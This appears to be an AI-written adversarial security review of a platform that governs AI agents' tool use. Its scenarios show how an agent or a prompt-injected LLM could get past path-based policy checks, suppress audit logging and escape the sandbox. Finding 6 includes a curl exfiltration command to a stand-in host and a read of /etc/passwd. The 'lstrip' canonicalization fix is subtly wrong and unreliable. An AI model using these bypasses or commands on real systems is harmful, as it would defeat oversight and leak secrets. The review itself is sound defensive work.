# Antigravity Gemini Flash — Adversarial Architecture & Security Review

**Project:** Enterprise Agent Security Platform  
**Review date:** 2026-10-03  
**Assessment:** Independent adversarial security review  
**Reviewer:** Google Antigravity — Gemini Flash  
**Repository modification:** None

> **Status:** Non-authoritative security assessment.
>
> This document preserves the original Gemini Flash review response. It is
> evidence for subsequent architecture adjudication and does not supersede
> ADRs, the threat model, or implementation contracts.

---

# Executive Summary

This report delivers an independent adversarial architecture and security review of the Enterprise Agent Security Platform.

### Overall Architectural Condition
The repository demonstrates a strong Zero Trust security posture. The trust boundaries are explicitly defined: the LLM is strictly constrained as an untrusted intent parser, core policy decisions are deterministic, execution authority is gated behind single-use cryptographically signed grants (`RuntimeExecutionGrant`), and tools are executed in an isolated child process sandbox rather than in-process.

The architecture separates family-scoped authorization (`ToolFamily`) from concrete implementation identity (`(tool_id, tool_version)`), enforces immutable receipts at the execution boundary, and provides clear separation between session evidence and agent enforcement posture.

### Summary of Findings
This independent review identified **10 material findings**:
- **3 High Severity** (Current Security Defect & Architecture Contradiction)
- **4 Medium Severity** (Design Gaps & Contradictions)
- **3 Low Severity** (Defensive Hardening & Future Scaffolding)

### Highest-Risk Areas
1. **Resource Authorization Bypass via Path Canonicalization (FINDING-1):** `PolicyEngine` evaluates protected resource access (`secrets.txt`) using exact string matching against raw request parameters. Path variations such as `./secrets.txt` or absolute paths bypass the policy check completely, allowing unauthorized file access.
2. **Session Event Foreign Key Constraint Violations on Refused Requests (FINDING-2):** `SessionEventModel` enforces a hard relational foreign key constraint to `tool_families.tool_id`. When a request names an unregistered or malformed tool ID, persisting the refusal event triggers a database foreign key violation (`IntegrityError`), crashing the request with a 500 error and preventing denial audit logging.
3. **Repository Factory Fails Open to Ephemeral In-Memory State in SQL Mode (FINDING-3):** Although `SqlToolRepository` and `SqlAuditEvidenceRepository` are fully implemented and exported in `app.repositories.sql`, `app/repositories/factory.py` omits their wiring. Setting `backend="sql"` silently falls back to in-memory repositories for tools and audit evidence, causing silent loss of audit trails on process restart.

### Architectural Decision Status
**No finding invalidates a locked architectural decision.** Rather, the critical findings represent implementation gaps where code diverges from the established architectural invariants (e.g., ADR-023, ADR-030, ADR-031, ADR-034).

---

# Findings

---

## FINDING-1 — Resource Authorization Bypass via Path Canonicalization

**Severity:** High  
**Confidence:** High  
**Classification:** Current Security Defect  

### Evidence
- **File:** [app/policy/policy_engine.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/policy/policy_engine.py#L44-L46)
- **Class / Function:** `PolicyEngine.evaluate_policy` (lines 44–46, 118–136)
- **Related File:** [app/models/execution_binding.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/models/execution_binding.py#L97-L137)

```python
# app/policy/policy_engine.py:44-46
class PolicyEngine:
    PROTECTED_RESOURCES: ClassVar[set[str]] = {
        "secrets.txt",
    }

# app/policy/policy_engine.py:118-121
        if (
            tool.tool_id == "file_read"
            and resource in self.PROTECTED_RESOURCES
        ):
            resource_check = AuthorizationCheck(
                status=AuthorizationCheckStatus.FAILED,
                reason=f"Access to protected resource '{resource}' is denied",
                details={"resource": str(resource), "tool_id": tool.tool_id},
            )
            return PolicyEvaluationResult(decision=Decision.DENY, ...)
```

### Problem
`PolicyEngine` evaluates resource restrictions through exact string membership: `resource in self.PROTECTED_RESOURCES`. Neither `PolicyEngine` nor `ExecutionBinding.from_operation` canonicalizes or normalizes the resource string.

### Attack / Failure Scenario
1. An attacker (or prompt-injected LLM) issues a tool invocation for `file_read` with `parameters={"path": "./secrets.txt"}`.
2. `ExecutionBinding.from_operation` creates an `ExecutionBinding` with `resource="./secrets.txt"`.
3. `PolicyEngine.evaluate_policy` checks `"./secrets.txt" in {"secrets.txt"}` which evaluates to `False`.
4. The policy engine issues `Decision.ALLOW`.
5. `RuntimeService` issues a valid `RuntimeExecutionGrant` for `resource="./secrets.txt"`.
6. `DefaultToolExecutor` invokes `FileReadTool.read("./secrets.txt")`.
7. `FileReadTool` executes `(self._workspace / "./secrets.txt").resolve()`, successfully reading and returning the contents of `/workspace/secrets.txt`.
8. The detection rule `SensitiveFileAccessRule` does not contain `secrets.txt` in `SENSITIVE_INDICATORS`, so no detection finding is generated.

### Impact
Complete bypass of resource-level policy enforcement. An agent permitted to use `file_read` can access any protected file in the workspace simply by prefixing `./` or using path traversal (`dir/../secrets.txt`).

### Affected Invariant
- Security Invariant #2: *"Tool execution always passes through the Runtime Security Pipeline."*
- ADR-023: *"Resource-aware policy applies to what would actually be executed."*

### ADR / Threat-Model Relationship
Contradicts Threat Model Boundary 3 ("Runtime Security Pipeline Enforcement") and ADR-023 §4.

### Four-Question Architecture Assessment
1. **Does this invalidate an existing architectural decision?** No. Resource authorization is an established architectural requirement; the implementation omitted canonicalization.
2. **Does this introduce a threat that should be added to the threat model?** Yes: "Path canonicalization evasion of resource policy boundaries."
3. **Does this belong in current implementation or future backlog?** Current implementation.
4. **Does this justify a new enterprise platform capability?** No, standard path canonicalization prior to policy evaluation.

### Recommended Action
Normalize and canonicalize resource paths before policy evaluation. In `ExecutionBinding.from_operation` (or a dedicated policy normalizer), resolve relative paths (e.g., `os.path.normpath(path).lstrip("./")`) so that `./secrets.txt`, `secrets.txt`, and `a/../secrets.txt` produce identical canonical resource representations.

---

## FINDING-2 — SessionEvent Foreign Key Constraint Breaks Fail-Closed Refusal Auditing for Unknown Tools

**Severity:** High  
**Confidence:** High  
**Classification:** Current Architecture Contradiction / Defect  

### Evidence
- **File:** [app/repositories/sql/models/session_event.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/repositories/sql/models/session_event.py#L41-L46)
- **Class:** `SessionEventModel` (lines 41–46, 63–67)
- **Related File:** [app/services/runtime_service.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/services/runtime_service.py#L927-L935)

```python
# app/repositories/sql/models/session_event.py:41-46
        ForeignKeyConstraint(
            ["tool_id", "tool_version"],
            ["tools.tool_id", "tools.version"],
            ondelete="RESTRICT",
        ),

# app/repositories/sql/models/session_event.py:63-67
    tool_id: Mapped[str] = mapped_column(
        String(128),
        ForeignKey("tool_families.tool_id", ondelete="RESTRICT"),
        nullable=False,
    )
```

### Problem
`SessionEventModel` defines relational foreign keys to `tool_families.tool_id` and `tools(tool_id, version)`. While `AuditEventModel` deliberately avoids foreign keys so that requests naming unregistered tools can be recorded (ADR-034), `SessionEventModel` enforces strict referential integrity.

### Attack / Failure Scenario
1. An attacker (or hallucinating LLM) requests execution of an unregistered tool (e.g. `tool_id="bash"` or `tool_id="malicious_tool"`).
2. `RuntimeService.execute` resolves the tool (`descriptor = None`, `tool_version = None`).
3. Authorization evaluates and produces `Decision.DENY` (reason: `Tool 'bash' is not registered`).
4. `RuntimeService` records the event in the session: `self._session_service.record_event(event)`.
5. `SqlSessionRepository.record_event` attempts to insert `SessionEventModel(tool_id="bash", ...)`.
6. PostgreSQL/SQLite raises a foreign key violation (`IntegrityError`) because `"bash"` does not exist in `tool_families`.
7. The database transaction rolls back, throwing an unhandled exception up through the API layer (HTTP 500).
8. The pipeline never reaches line 1184 (`self._audit_service.record_event`), meaning the denial is **never audited**.

### Impact
Denial of service and loss of security visibility. An attacker can crash the runtime execution pipeline and suppress audit logging simply by submitting requests with non-existent tool names.

### Affected Invariant
- Security Invariant #16: *"Recording audit evidence never depends on control-plane state: a failed audit write fails the request closed... so audit storage carries no foreign key to the tool registry and no constraint that reads another table."*
- ADR-034: *"Audit identity contract — refusals for unknown tools must remain recordable."*

### ADR / Threat-Model Relationship
Direct contradiction with Threat Model Invariant #16 and ADR-034.

### Four-Question Architecture Assessment
1. **Does this invalidate an existing architectural decision?** No, it enforces the intended decision from ADR-034 that was accidentally violated in `SessionEventModel`.
2. **Does this introduce a threat that should be added to the threat model?** Yes: "Foreign key integrity failure suppressing behavioral and audit evidence."
3. **Does this belong in current implementation or future backlog?** Current implementation.
4. **Does this justify a new enterprise platform capability?** No, schema correction.

### Recommended Action
Drop the `ForeignKey("tool_families.tool_id")` and composite `ForeignKeyConstraint` from `SessionEventModel`. Allow `tool_id` and `tool_version` on `SessionEventModel` to be plain scalar strings, exactly as implemented in `AuditEventModel`.

---

## FINDING-3 — Repository Factory Silently Reverts to In-Memory Adapters for SQL Deployments

**Severity:** High  
**Confidence:** High  
**Classification:** Current Architecture Defect  

### Evidence
- **File:** [app/repositories/factory.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/repositories/factory.py#L97-L104)
- **Function:** `create_repositories` (lines 31–36, 97–104)
- **Related Files:** [app/repositories/sql/audit_evidence_repository.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/repositories/sql/audit_evidence_repository.py), [app/repositories/sql/tool_repository.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/repositories/sql/tool_repository.py)

```python
# app/repositories/factory.py:97-104
        return RepositoryContainer(
            agent_repository=agent_repository or InMemoryAgentRepository(),
            tool_repository=tool_repository or InMemoryToolRepository(),
            session_repository=SqlSessionRepository(sf),
            enforcement_repository=SqlEnforcementStateRepository(sf),
            approval_grant_repository=SqlApprovalContinuationRepository(sf),
            audit_repository=audit_repository or InMemoryAuditEvidenceRepository(),
        )
```

### Problem
`SqlToolRepository` and `SqlAuditEvidenceRepository` are fully implemented and exported in `app.repositories.sql.__all__`. However, `factory.py` does not import them and silently falls back to `InMemoryToolRepository()` and `InMemoryAuditEvidenceRepository()` when `backend="sql"` is selected without explicit overrides. Furthermore, no `SqlAgentRepository` exists in the repository.

### Attack / Failure Scenario
1. An administrator deploys the platform using a relational database (`backend="sql"`, providing a database engine).
2. The platform boots up. Auditing and tool governance run in-memory.
3. Multiple security decisions and containment actions are executed.
4. The service process restarts or scales out.
5. All audit evidence and registered tools are erased. Any new worker process has zero audit history and zero knowledge of previously registered tools.

### Impact
Silent loss of durable compliance audit records and tool governance state in production SQL deployments. This directly violates the durability guarantee of the platform.

### Affected Invariant
- Security Invariant #4: *"Every final decision is audited."*
- ADR-030: *"Durable State Repository Architecture — Domain services receive repository protocols exclusively backed by relational persistence."*

### ADR / Threat-Model Relationship
Contradicts ADR-030 §3 and Threat Model Section 5 ("Audit Subsystem").

### Four-Question Architecture Assessment
1. **Does this invalidate an existing architectural decision?** No. The architectural decision explicitly called for SQL repositories.
2. **Does this introduce a threat that should be added to the threat model?** Yes: "Evidence durability loss via unintended in-memory fallback in composition factory."
3. **Does this belong in current implementation or future backlog?** Current implementation.
4. **Does this justify a new enterprise platform capability?** No, wiring bug fix.

### Recommended Action
1. In `app/repositories/factory.py`, import `SqlAuditEvidenceRepository` and `SqlToolRepository` from `app.repositories.sql`.
2. Update `create_repositories` to instantiate `SqlAuditEvidenceRepository(sf)` and `SqlToolRepository(sf)` by default when `backend="sql"`.
3. Implement `SqlAgentRepository` using `AgentModel` so that `agent_repository` is also backed by SQL.

---

## FINDING-4 — `AgentStatus.REGISTERED` Bypasses Policy Engine and Masquerades as Active

**Severity:** Medium  
**Confidence:** High  
**Classification:** Current Defect / Design Gap  

### Evidence
- **File:** [app/policy/policy_engine.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/policy/policy_engine.py#L54-L75)
- **File:** [app/models/agent.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/models/agent.py#L6-L11)
- **Class / Function:** `PolicyEngine.evaluate_policy` (lines 54–75)

```python
# app/policy/policy_engine.py:54-75
        if agent.status in {
            AgentStatus.SUSPENDED,
            AgentStatus.DISABLED,
        }:
            status_check = AuthorizationCheck(
                status=AuthorizationCheckStatus.FAILED,
                reason=f"Agent '{agent.agent_id}' is in inactive status: {agent.status.value}",
                details={"agent_id": agent.agent_id, "status": agent.status.value},
            )
            return PolicyEvaluationResult(decision=Decision.DENY, ...)

        status_check = AuthorizationCheck(
            status=AuthorizationCheckStatus.PASSED,
            reason=f"Agent '{agent.agent_id}' is active",
            details={"agent_id": agent.agent_id, "status": agent.status.value},
        )
```

### Problem
`AgentStatus` defines four states: `REGISTERED`, `ACTIVE`, `SUSPENDED`, `DISABLED`. The default status upon agent creation is `AgentStatus.REGISTERED`. However, `PolicyEngine` checks status via a negative exclusion list (`SUSPENDED`, `DISABLED`). An agent in `REGISTERED` status falls through to `PASSED` with the audit reason claiming `"Agent is active"`.

### Attack / Failure Scenario
An enterprise deploys an agent onboarding process where newly registered agents remain in `REGISTERED` status until an administrator reviews and approves their permissions. Because `PolicyEngine` does not require `status == AgentStatus.ACTIVE`, the unactivated agent can immediately execute tools upon registration.

### Impact
Lifecycle governance bypass. Agents that have not been explicitly activated can execute operations as if they were `ACTIVE`.

### Affected Invariant
- Principle of Explicit Authorization / Fail-Closed Status Validation.

### Four-Question Architecture Assessment
1. **Does this invalidate an existing architectural decision?** No.
2. **Does this introduce a threat that should be added to the threat model?** Yes: "Premature execution authorization of un-activated agent identities."
3. **Does this belong in current implementation or future backlog?** Current implementation.
4. **Does this justify a new enterprise platform capability?** No.

### Recommended Action
In `PolicyEngine.evaluate_policy`, change the status check from a negative exclusion to a positive assertion:
```python
if agent.status != AgentStatus.ACTIVE:
    return PolicyEvaluationResult(decision=Decision.DENY, status_check=AuthorizationCheck(status=AuthorizationCheckStatus.FAILED, reason=f"Agent '{agent.agent_id}' is not ACTIVE (status: {agent.status.value})"), ...)
```
Ensure `AgentService` provides an explicit lifecycle transition from `REGISTERED` to `ACTIVE`.

---

## FINDING-5 — Approval Continuation Atomic Claim Omits Epoch and Expiration Validation

**Severity:** Medium  
**Confidence:** High  
**Classification:** Design Gap in Adopted Workstream  

### Evidence
- **File:** [app/repositories/sql/approval_continuation_repository.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/repositories/sql/approval_continuation_repository.py#L117-L137)
- **Function:** `SqlApprovalContinuationRepository.transition_continuation`
- **Related Test:** [tests/repositories/sql/test_sql_continuation_concurrency_postgres.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/tests/repositories/sql/test_sql_continuation_concurrency_postgres.py#L121-L145)

```python
# app/repositories/sql/approval_continuation_repository.py:117-137
        with transactional_session(self._session_factory) as db:
            row = db.execute(
                select(ApprovalContinuationModel)
                .where(ApprovalContinuationModel.grant_id == grant_id)
                .with_for_update()
            ).scalar_one_or_none()

            if row is None or row.state != from_state.value:
                return False

            row.state = to_state.value
            # ... no check on row.expires_at or enforcement_epoch ...
            return True
```

### Problem
ADR-031 §9 specifies that continuation claims must be atomic check-and-set operations verifying three conditions:
1. `state == APPROVED`
2. `now < expires_at`
3. `enforcement_epoch == current_agent_epoch`

In both `SqlApprovalContinuationRepository` and `InMemoryApprovalContinuationRepository`, `transition_continuation` only verifies `row.state == from_state.value`. In test `test_sql_continuation_concurrency_postgres.py` (lines 121–145), workers successfully transition a grant where `expires_at` was set in the past.

### Attack / Failure Scenario
1. A human operator approves an action (`PENDING -> APPROVED`), generating an `ApprovalContinuation` with an expiration timestamp and bound `enforcement_epoch=1`.
2. The agent is subsequently suspended due to anomalous behavior, incrementing its epoch to 2.
3. The continuation passes its expiration deadline (`now > expires_at`).
4. A claimant attempts to claim the continuation. `transition_continuation` succeeds, flipping the state to `CONSUMED`.
5. Stale, expired, or post-suspension authority is consumed.

### Impact
Potential execution of expired or post-suspension continuation authority once the resumption service layer is wired to this repository.

### Affected Invariant
- ADR-031 §9: *"Atomic claim contract — succeeds only if state == APPROVED and expected_epoch matches and now < expires_at."*

### Four-Question Architecture Assessment
1. **Does this invalidate an existing architectural decision?** No, it implements the missing portion of ADR-031 §9.
2. **Does this introduce a threat that should be added to the threat model?** Yes: "Consumption of expired or desynchronized approval continuations."
3. **Does this belong in current implementation or future backlog?** Current implementation.
4. **Does this justify a new enterprise platform capability?** No.

### Recommended Action
Update the `transition_continuation` signature and implementation in `ApprovalContinuationRepository` to accept `now: datetime` and `expected_epoch: int | None`. In the atomic SQL query (`FOR UPDATE`), enforce:
```python
if row.expires_at <= now:
    return False
if expected_epoch is not None and row.enforcement_epoch != expected_epoch:
    return False
```

---

## FINDING-6 — Process-Level Sandbox Fails to Intercept Subprocess and Exec Syscalls

**Severity:** Medium  
**Confidence:** High  
**Classification:** Design Gap / Sandbox Boundary Limitation  

### Evidence
- **File:** [app/runtime/sandbox/filesystem.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/runtime/sandbox/filesystem.py#L234-L285)
- **File:** [app/runtime/sandbox/network.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/runtime/sandbox/network.py#L268-L300)
- **Class:** `FilesystemSandboxGuard`, `NetworkSandboxGuard`

### Problem
`FilesystemSandboxGuard` and `NetworkSandboxGuard` monitor execution by installing a CPython audit hook (`sys.addaudithook`) for filesystem (`open`, `os.mkdir`, etc.) and network events (`socket.connect`, `socket.bind`). However, neither guard hooks process-creation events (`subprocess.Popen`, `os.system`, `os.exec*`, `os.spawn*`).

### Attack / Failure Scenario
1. Tool code is invoked inside the subprocess sandbox runner.
2. The tool code executes `subprocess.run(["curl", "http://external-exfil.com?data=..."])` or `subprocess.run(["cat", "/etc/passwd"], capture_output=True)`.
3. The CPython audit hooks in the parent runner process do not intercept the child process's raw OS syscalls.
4. Network egress and filesystem restrictions are bypassed.

### Impact
Process-level sandbox escape for any tool implementation that executes subprocesses.

### Affected Invariant
- ADR-032: *"Does ordinary Python tool code stay within its declared network and filesystem capability?"*

### Four-Question Architecture Assessment
1. **Does this invalidate an existing architectural decision?** No. ADR-032 explicitly designates the v0.17 sandbox as a "Level 2" process sandbox, reserving container/microVM isolation for Level 3.
2. **Does this introduce a threat that should be added to the threat model?** Yes: "Subprocess execution escaping CPython audit-hook sandbox guards."
3. **Does this belong in current implementation or future backlog?** Near-term hardening.
4. **Does this justify a new enterprise platform capability?** Yes, container/microVM backend (Level 3 sandbox).

### Recommended Action
1. In the runner audit hook, intercept `subprocess.Popen` and `os.system`. Unless the capability profile explicitly grants subprocess execution, block process spawning:
   ```python
   if event in ("subprocess.Popen", "os.system", "os.posix_spawn", "os.spawn"):
       raise PermissionError("Subprocess creation is forbidden in sandbox")
   ```
2. Document in the threat model that Level 2 isolation relies on CPython audit hooks and cannot defend against native binary execution without container namespaces.

---

## FINDING-7 — Capability Profile Resolution is Family-Scoped Instead of Concrete-Version Scoped

**Severity:** Medium  
**Confidence:** High  
**Classification:** Architecture Contradiction / Design Gap  

### Evidence
- **File:** [app/services/runtime_service.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/services/runtime_service.py#L1128-L1134)
- **Method:** `RuntimeService.execute` (line 1128) and `_create_default_capability_registry` (lines 212–243)

```python
# app/services/runtime_service.py:1128-1134
            cap_profile_id = None
            cap_digest = None
            profile_id = f"profile-{tool_id}"
            if self._capability_registry is not None and self._capability_registry.exists(
                profile_id
            ):
                caps = self._capability_registry.resolve_profile(profile_id)
                cap_profile_id = caps.capability_profile_id
                cap_digest = caps.compute_digest()
```

### Problem
The documented architectural principle dictates:
- Tool approval is family-scoped (`tool_id`).
- Capability profiles are concrete-version scoped (`(tool_id, tool_version)`).
However, `RuntimeService.execute` resolves capability profiles by formatting `profile_id = f"profile-{tool_id}"`, ignoring `tool_version` completely.

### Attack / Failure Scenario
1. A tool family `data_exporter` has version `1.0.0` (read-only filesystem) and version `2.0.0` (read-write network capability).
2. Because profile lookup is hardcoded to `f"profile-{tool_id}"`, both versions are forced to bind to the same single capability profile.
3. If version 2.0.0 is executed, it either runs under version 1.0.0's restricted profile (causing legitimate execution to fail) or version 1.0.0 inherits version 2.0.0's elevated privileges (privilege over-grant).

### Impact
Loss of granular, least-privilege capability containment across different versions of the same tool family.

### Affected Invariant
- Architectural Principle: *"Capability profiles are concrete-version scoped."*
- ADR-032 §3: *"CapabilityApplicability is a relationship: `(tool_id, version) -> capability_profile_id`."*

### Four-Question Architecture Assessment
1. **Does this invalidate an existing architectural decision?** No, it aligns code with the existing architectural principle.
2. **Does this introduce a threat that should be added to the threat model?** Yes: "Cross-version capability confusion in multi-version tool families."
3. **Does this belong in current implementation or future backlog?** Near-term backlog / current implementation.
4. **Does this justify a new enterprise platform capability?** Yes, control-plane `CapabilityApplicability` mapping.

### Recommended Action
Update profile resolution in `RuntimeService` to incorporate the concrete resolved version:
```python
profile_id = f"profile-{tool_id}-{tool_version}"
```
Or query a version-aware capability applicability mapping before falling back to `profile-{tool_id}`.

---

## FINDING-8 — `SessionEvent` Conflates Requested Identity with Resolved Identity

**Severity:** Low  
**Confidence:** High  
**Classification:** Design Gap  

### Evidence
- **File:** [app/models/session_event.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/models/session_event.py#L59-L70)
- **Model:** `SessionEvent` vs `AuditEvent` ([app/models/audit_event.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/models/audit_event.py#L41-L54))

### Problem
`AuditEvent` deliberately separates `requested_tool_id` (the untrusted string submitted across the trust boundary) from `tool_id` (the established, verified tool family). In contrast, `SessionEvent` has only `tool_id: str`. When a request is refused before resolution, `SessionEvent.tool_id` stores the unverified string directly in `tool_id`.

### Impact
Downstream consumers and behavioral detection rules inspecting session history cannot determine from the model whether `tool_id` represents an authorized platform tool or an unverified attacker payload.

### Affected Invariant
- Audit and Evidence Semantics: *"Distinguish requested identity from resolved identity."*

### Four-Question Architecture Assessment
1. **Does this invalidate an existing architectural decision?** No.
2. **Does this introduce a threat that should be added to the threat model?** No.
3. **Does this belong in current implementation or future backlog?** Future backlog.
4. **Does this justify a new enterprise platform capability?** No.

### Recommended Action
Add `requested_tool_id: str` to `SessionEvent`, matching `AuditEvent`. Set `tool_id: str | None` such that `tool_id` is only populated when tool family validation succeeds.

---

## FINDING-9 — JWT Verification Raises Unhandled `TypeError` on Non-Dictionary Payloads

**Severity:** Low  
**Confidence:** High  
**Classification:** Defensive Hardening  

### Evidence
- **File:** [app/auth/jwt_service.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/auth/jwt_service.py#L64-L67)
- **Function:** `JWTService.verify_token`

```python
# app/auth/jwt_service.py:64-67
        try:
            return JWTClaims(**payload)
        except ValidationError as e:
            raise ValueError(f"Invalid token claims: {e}") from e
```

### Problem
`jwt.decode` returns whatever JSON root type was encoded. If a token was signed containing a raw string or list instead of a JSON object (e.g. `"not-a-dict"`), the unpacking `**payload` raises a Python `TypeError`. The `except` block only catches `ValidationError`, allowing `TypeError` to bubble up as an unhandled 500 error.

### Attack / Failure Scenario
An internal service with signing capability mis-encodes a JWT payload as a primitive string. The request crashes the API with HTTP 500 instead of failing closed with HTTP 401.

### Impact
Uncontrolled 500 Internal Server Error in authentication handling.

### Four-Question Architecture Assessment
1. **Does this invalidate an existing architectural decision?** No.
2. **Does this introduce a threat that should be added to the threat model?** No.
3. **Does this belong in current implementation or future backlog?** Current implementation.
4. **Does this justify a new enterprise platform capability?** No.

### Recommended Action
Add a type guard in `verify_token`:
```python
if not isinstance(payload, dict):
    raise ValueError("Invalid token payload: expected JSON object")
```

---

## FINDING-10 — Execution Reconciler Crash-Consistency is Inoperative with In-Memory Store

**Severity:** Low  
**Confidence:** High  
**Classification:** Documented Design Gap  

### Evidence
- **File:** [app/services/execution_reconciler.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/services/execution_reconciler.py#L125-L128)
- **Method:** `ExecutionReconciler.reconcile_on_startup`
- **File:** [app/api/dependencies.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/api/dependencies.py#L117-L121)

### Problem
`app/main.py` runs `execution_reconciler.reconcile_on_startup()` in its lifespan startup hook to reconcile open `STARTED` receipts from crashed processes into `UNKNOWN`. However, `execution_evidence_store` is instantiated as an in-process `ExecutionEvidenceService` (in-memory dictionary). Upon process restart, the in-memory store starts empty, making startup crash reconciliation a no-op.

### Note on Architecture
This is explicitly acknowledged in the code docstring (`app/services/execution_reconciler.py:125-128`):
*"For the current in-memory evidence store, an ordinary process restart creates an empty store. When a durable evidence store is introduced, this method reconciles orphaned receipts that were in-flight when the previous process died."*

### Four-Question Architecture Assessment
1. **Does this invalidate an existing architectural decision?** No, it is planned scaffolding.
2. **Does this introduce a threat that should be added to the threat model?** No.
3. **Does this belong in current implementation or future backlog?** Future backlog (Durable Evidence Store milestone).
4. **Does this justify a new enterprise platform capability?** Yes: `SqlExecutionEvidenceStore`.

### Recommended Action
Retain the startup hook and implement a relational `SqlExecutionEvidenceStore` implementing `ExecutionEvidenceStoreProtocol` to make startup reconciliation functional across container/process restarts.

---

# Cross-Cutting Observations

1. **Deterministic Containment Gates:** The platform excels at failing closed during runtime decision-making. When an execution binding cannot be established, when capability profiles are missing, or when CAS epoch checks fail, `RuntimeService` systematically downgrades `Decision.ALLOW` to `Decision.DENY` before returning to the caller.
2. **Separation of Authorization from Enforcement:** Authorization is correctly treated as answering *"is this agent allowed to request this tool?"* while containment answers *"can this specific concrete implementation safely run under sandbox capabilities?"*.
3. **Ephemeral Execution Authority vs Durable Continuation:** The platform preserves a clean architectural separation between `RuntimeExecutionGrant` (ephemeral, 30s TTL, process-bound HMAC) and `ApprovalContinuation` (durable, human-approved, database-persisted).
4. **Comprehensive Regression Suite:** Regression test suites (`test_audit_immutability_regressions.py`, `test_session_event_ordering_regressions.py`, `test_execution_provenance_regressions.py`) enforce critical invariants at the test layer.

---

# Architecture Contradictions

| # | Component A | Component B | Contradiction Details |
|---|-------------|-------------|-----------------------|
| 1 | `threat-model.md` Invariant 16 / ADR-034 | `SessionEventModel` in `app/repositories/sql/models/session_event.py` | Invariant 16 mandates that evidence recording must never depend on control-plane state or foreign keys to tool tables. `SessionEventModel` violates this by adding `ForeignKey("tool_families.tool_id")` and `ForeignKeyConstraint(["tool_id", "tool_version"])`. |
| 2 | ADR-030 / `app.repositories.sql.__all__` | `app/repositories/factory.py:create_repositories` | ADR-030 specifies durable persistence for all repositories in SQL mode. The factory fails to wire `SqlToolRepository` and `SqlAuditEvidenceRepository`, falling back to in-memory instances. |
| 3 | Architectural Principle: *"Capability profiles are concrete-version scoped."* | `RuntimeService.execute:1128` | Capability profiles are queried using `f"profile-{tool_id}"`, collapsing versioned profiles into a single family-scoped profile. |

---

# Missing Security Invariants

1. **Path Canonicalization Invariant:** Resource strings bound in `ExecutionBinding` must be canonicalized and path-normalized before evaluation against resource policy rules.
2. **Positive Agent Activation Invariant:** Only agents with `AgentStatus.ACTIVE` may receive `Decision.ALLOW`. All other states (`REGISTERED`, `SUSPENDED`, `DISABLED`) must fail closed.
3. **Subprocess Restriction Invariant:** Tool code executing inside the subprocess sandbox must be prevented from spawning child processes via `subprocess` or `os.system` unless explicitly authorized by capability profiles.
4. **Continuation Epoch Validation Invariant:** Transitioning an `ApprovalContinuation` to `CONSUMED` must atomically verify that the current agent epoch matches `enforcement_epoch` and `now < expires_at`.

---

# False Positives / Rejected Concerns

### FP-1: Session Event Ordering by `(timestamp, sequence_number)`
- **Apparent Concern:** In `SqlSessionRepository.list_events`, events are ordered by `timestamp.asc()`, then `sequence_number.asc()`. It might appear that `sequence_number` should be the primary sort key rather than `timestamp`.
- **Why Rejected (False Positive):** `test_session_event_ordering_regressions.py` and invariant M4-EVENT-8 explicitly declare that `(timestamp, sequence_number)` is the locked canonical ordering key. Chronology is an authoritative contract (M4-EVENT-7) for out-of-order event arrivals, with `sequence_number` strictly acting as the immutable per-session tie-breaker for identical timestamps.

### FP-2: `AmbiguousToolVersionError` Unhandled in `RuntimeService`
- **Apparent Concern:** In `app/services/runtime_service.py` line 813, the exception handler catches `(ToolNotRegisteredError, ToolVersionMismatchError)`, which appears to omit `AmbiguousToolVersionError`.
- **Why Rejected (False Positive):** In `app/registry/tool_registry.py:29`, `class AmbiguousToolVersionError(ToolVersionMismatchError)` subclasses `ToolVersionMismatchError`. Python's `except` block catches it by inheritance, safely falling back to `descriptor = None` and failing closed.

### FP-3: Unbounded Memory Growth in `AgentLockManager`
- **Apparent Concern:** `AgentLockManager._locks` allocates an `RLock` per `agent_id` with no eviction, suggesting an unauthenticated denial-of-service vector via memory exhaustion.
- **Why Rejected (False Positive):** All ingress callers of `AgentLockManager` are guarded by upstream authentication. In `POST /agents/{agent_id}/execute`, `require_execution_identity` requires a valid Bearer JWT where `claims.agent_id == agent_id`. In management endpoints, `require_roles(Role.ADMIN)` is enforced. Unauthenticated or arbitrary agent IDs cannot reach the lock manager.

### FP-4: Tool Implementation Substitution via `ToolRegistry.unregister`
- **Apparent Concern:** `ToolRegistry.unregister(tool_id, version)` removes a descriptor, allowing a subsequent `register()` call to substitute a different executable factory under the same version.
- **Why Rejected (False Positive):** `unregister()` is not exposed via any HTTP route or management endpoint; it is an internal test utility. Furthermore, once an `ExecutionGrant` is issued, it binds `capability_digest` and `implementation_id`, and `MAX_GRANT_TTL_SECONDS = 30.0` prevents long-lived replay.

### FP-5: Demo Prompt Teaches `secrets.txt` Exfiltration in `OllamaAgent`
- **Apparent Concern:** `app/agents/ollama_agent.py` contains a few-shot example converting `"please read secrets.txt"` into `file_read`.
- **Why Rejected (False Positive):** The platform is a security gateway designed to intercept and govern agent intent. The system prompt in `OllamaAgent` is intentionally designed for demonstration and security evaluation scenarios to test the platform's detection and policy engine.

---

# Recommended Review Order

When remediating these findings, address them in the following prioritized order:

1. **FINDING-1 (Resource Path Canonicalization Bypass):** Fix in `app/policy/policy_engine.py` and `app/models/execution_binding.py`. Canonicalize resource paths before evaluating `PROTECTED_RESOURCES`.
2. **FINDING-2 (SessionEvent Foreign Key Constraints):** Remove foreign key constraints to `tool_families` and `tools` in `app/repositories/sql/models/session_event.py` and create an Alembic migration. Fixes runtime crashes on unregistered tool requests.
